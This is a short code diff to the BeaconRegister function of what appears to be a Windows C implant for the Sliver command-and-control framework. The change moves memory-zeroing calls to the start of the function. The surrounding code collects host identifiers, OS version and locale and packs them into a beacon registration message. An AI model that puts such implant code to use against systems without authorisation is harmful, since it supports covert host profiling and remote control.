@@ -149,11 +149,15 @@ BOOL BeaconRegister
 	WCHAR wszLocale[0x20];
 	BOOL Result = FALSE;
 	CHAR szOsName[] = "windows";
-
 	PPBElement pFinalElement = NULL;
 	PPBElement ElementList[17];
 	PPBElement BeaconRegElements[5];
 	ENVELOPE RegisterEnvelope;
+
+	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
+	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
+	SecureZeroMemory(ElementList, sizeof(ElementList));
+	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
 
 	lpUUID = GetHostUUID();
 	if (lpUUID == NULL) {
@@ -176,14 +180,12 @@ BOOL BeaconRegister
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
 	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
 	if (!GetOsVersion(&OsVersion)) {
 		LOG_ERROR("GetOsVersion", GetLastError());
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
 	GetNativeSystemInfo(&SystemInfo);
 	lpVersion = ALLOC(0x100);
 	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
@@ -216,7 +218,6 @@ BOOL BeaconRegister
 	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 
-	SecureZeroMemory(ElementList, sizeof(ElementList));
 	ElementList[0] = CreateBytesElement(pBeacon->pGlobalConfig->szSliverName, lstrlenA(pBeacon->pGlobalConfig->szSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
@@ -241,7 +242,6 @@ BOOL BeaconRegister
 	BeaconRegElements[4] = CreateVarIntElement(GetNextCheckin(pBeacon), 5);
 
 	pFinalElement = CreateStructElement(BeaconRegElements, _countof(BeaconRegElements), 0);
-	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
 	RegisterEnvelope.uType = MsgBeaconRegister;
 	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
